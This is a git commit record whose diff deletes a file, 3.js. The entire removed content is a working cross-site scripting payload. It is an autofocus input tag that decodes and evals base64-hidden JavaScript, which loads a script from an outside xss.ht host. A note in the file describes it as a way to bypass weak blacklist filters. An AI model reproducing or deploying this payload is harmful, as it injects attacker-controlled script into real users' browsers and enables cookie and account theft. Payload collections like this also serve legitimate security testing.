3188c235a231cb23ab0d66bacfdec8496d647457
Bimal Kumar Sahoo <60147925+srb1mal@users.noreply.github.com>
2024-09-17 14:26:23 +0530

    Delete 3.js

--- 3.js
+++
@@ -1,3 +0,0 @@
-"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc29tdGhlaGFjazNyeHNzaHQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
-
-###<input> Tag Payload - For bypassing poorly designed blacklist systems with the HTML5 autofocus attribute.
